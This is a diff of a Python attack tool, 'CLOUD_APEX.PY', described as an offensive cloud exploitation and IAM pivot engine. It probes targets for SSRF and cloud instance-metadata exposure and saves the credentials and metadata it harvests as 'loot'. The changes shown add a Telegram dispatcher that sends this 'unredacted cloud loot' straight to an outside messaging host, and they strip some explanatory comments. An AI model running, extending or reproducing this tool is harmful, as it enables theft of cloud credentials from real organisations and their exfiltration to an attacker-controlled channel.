@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-CLOUD_APEX.PY — Active Cloud Infrastructure Exploitation & IAM Pivot Engine v7.6
+CLOUD_APEX.PY — Active Cloud Infrastructure Exploitation & IAM Pivot Engine v8.0 (With Telegram Telemetry)
 Features:
 - Live AWS control plane pivoting and IAM enumeration
 - Automated instance metadata service (IMDSv1/IMDSv2) & SSRF credential exfiltration
@@ -8,6 +8,7 @@ Features:
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
 - Zero-disk memory processing & secure TLS ciphers inspection
 - Compatible run_cloud_apex(target_host) interface
+- Real-time asynchronous Telegram notification dispatch for unredacted cloud loot
 """
 import asyncio
 import json
@@ -20,9 +21,10 @@ import ipaddress
 from urllib.parse import urlsplit
 import sys
 
-# Import centralized framework telemetry and immutable loot persistence
+# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
 
 # ============================================================
 # CONFIGURATION & OFFENSIVE PAYLOADS
@@ -34,7 +36,7 @@ SSL_CONTEXT.check_hostname = False
 SSL_CONTEXT.verify_mode = ssl.CERT_NONE
 
 # ============================================================
-# TERMINAL OUTPUT
+# TERMINAL OUTPUT & TELEGRAM DISPATCHER
 # ============================================================
 class Colors:
     RED = "\033[91m"
@@ -49,6 +51,17 @@ class Colors:
 def log(message, color=Colors.RESET):
     sys.stdout.write(f"{color}{message}{Colors.RESET}\n")
     sys.stdout.flush()
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous cloud apex functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 # ============================================================
 # TARGET VALIDATION
@@ -75,7 +88,7 @@ def normalize_target(target):
 # ============================================================
 def http_get(url, headers=None):
     request_headers = {
-        "User-Agent": "BruteDog-Offensive-CloudApex/5.2",
+        "User-Agent": "BruteDog-Offensive-CloudApex/8.0",
         "Accept": "application/json,text/plain,*/*",
     }
     if headers:
@@ -178,9 +191,6 @@ class ApexCloudAndSyscallEngine:
             res = http_get(test_url)
             body_lower = (res["body"] or "").lower()
 
-            # Strict Positive Verification:
-            # Must return HTTP 200, have content, NOT be an HTML/SPA shell, 
-            # and contain valid cloud/metadata structural indicators.
             is_html_or_spa = (
                 "<!doctype html>" in body_lower or 
                 "<html" in body_lower or 
@@ -198,8 +208,18 @@ class ApexCloudAndSyscallEngine:
             if res["status"] == 200 and len(res["body"].strip()) > 0 and not is_html_or_spa and has_metadata_indicators:
                 log(f"\n\033[1m\033[91m[***] VERIFIED CLOUD METADATA / SSRF EXPOSURE CONFIRMED [{path}] [***]{Colors.RESET}", Colors.RED)
                 log(f"  └── Data : {res['body'][:300]}", Colors.GREEN)
-                exfiltrated_credentials.append({"path": path, "data": res['body'][:300]})
                 
+                loot_payload = {
+                    "endpoint": test_url,
+                    "path": path,
+                    "status": res["status"],
+                    "metadata_sample": res['body'][:500]
+                }
+                exfiltrated_credentials.append(loot_payload)
+                
+                # BROADCAST UNREDACTED CLOUD LOOT STRAIGHT TO TELEGRAM
+                broadcast_tg_alert_sync("Cloud Metadata / SSRF Exposure Confirmed", loot_payload)
+
                 # STREAM TELEMETRY & PERSIST CLOUD LOOT TO DISK IMMEDIATELY
                 stream_proof("CLOUD_METADATA_EXPOSURE_VERIFIED", test_url, {"path": path}, res['body'][:300], {"exposed": True})
                 save_session_loot(
@@ -209,7 +229,7 @@ class ApexCloudAndSyscallEngine:
                     status=res["status"],
                     headers=res["headers"],
                     body=res["body"],
-                    extra_loot={"ssrf_path": path}
+                    extra_loot=loot_payload
                 )
             else:
                 log(f"[-] Path {path} returned HTTP {res['status']} (Mitigated or non-existent metadata).", Colors.GRAY)
@@ -299,7 +319,6 @@ async def run_cloud_apex(target_host, options=None):
     metadata_result = await asyncio.to_thread(engine.check_cloud_metadata_exposure, base_url)
     tls_result = await asyncio.to_thread(engine.inspect_tls, base_url)
     
-    # Determine actual credential collection based on verified exfiltration results
     credentials_collected = len(metadata_result.get("exfiltrated_data", [])) > 0
     
     manifest = {
